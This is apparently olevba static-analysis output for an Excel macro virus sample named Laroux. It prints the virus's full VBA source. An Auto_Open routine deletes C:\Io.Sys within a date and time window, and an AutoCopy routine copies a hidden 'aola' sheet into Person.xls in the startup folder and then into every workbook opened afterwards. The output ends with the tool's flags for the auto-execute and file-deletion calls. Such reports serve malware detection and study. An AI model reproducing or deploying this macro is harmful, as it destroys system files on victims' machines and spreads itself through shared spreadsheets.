olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.hp-f3f6b9944f11a285cc4c4e4f25888b1dbf7cd16e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO aola.bas 
in file: Virus.MSExcel.Laroux.hp-f3f6b9944f11a285cc4c4e4f25888b1dbf7cd16e - OLE stream: '_VBA_PROJECT_CUR/VBA/aola'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    If Day(Date) >= 4 And Day(Date) <= 13 And Time < #2:25:00 PM# Then
        SetAttr "C:\Io.Sys", vbNormal
        Kill "C:\Io.Sys"
    End If
    Application.OnSheetActivate = "AutoCopy"
End Sub

Sub AutoCopy()
Attribute AutoCopy.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim sStPath, sFile, swName, swnew, sCurDir As String
    Dim bPtoF, bFtoP As Boolean
    
    bPtoF = False
    bFtoP = False
    On Error Resume Next
    sStPath = Application.StartupPath
    sFile = Dir(sStPath & "\" & "Person.xls")
    
    bFtoP = sFile <> "Person.xls"
    
    bPtoF = Not (bFtoP And (ActiveWorkbook.Modules.Count > 0))
    
    If bFtoP Then
        Application.ScreenUpdating = False
        swName = ActiveWorkbook.Name
        Sheets("aola").Visible = True
        Sheets("aola").Select
        Sheets("aola").Copy
        swnew = ActiveWorkbook.Name
        sCurDir = CurDir()
        
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(swnew).SaveAs FileName:=Application.StartupPath & "/" & "Person.xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir sCurDir
        Workbooks(swName).Sheets("aola").Visible = False
        ActiveWindow.ActivateNext
    End If
    
    If bPtoF And (Not bFtoP) Then
        swnew = ActiveWorkbook.Name
        Application.ScreenUpdating = False
        sCurDir = ActiveWorkbook.Path
        If Workbooks(swnew).Sheets(1).Name <> "aola" Then
            Workbooks("Person.xls").Sheets("aola").Copy before:=Workbooks(swnew).Sheets(1)
            Workbooks(swnew).Sheets("aola").Visible = False
            Workbooks(swnew).Save
        End If
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Person.xls!AutoCopy"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  aol
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

